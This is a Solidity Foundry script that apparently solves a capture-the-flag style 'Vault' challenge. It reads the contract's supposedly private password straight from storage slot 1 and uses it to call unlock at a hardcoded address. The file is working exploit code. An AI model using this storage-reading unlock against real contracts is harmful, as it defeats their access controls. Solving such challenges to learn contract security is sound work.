// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract VaultSolution is Script {

    Vault public vaultInstance = Vault(0x9A098F2406b3DEAF9C9523ddC9D09C82B5f61045);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        bytes32 locked = vm.load(address(vaultInstance), bytes32(uint256(0)));
        console.logBytes32(locked);

        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));
        console.logBytes32(password);

        vaultInstance.unlock(password);

        vm.stopBroadcast();
    }
}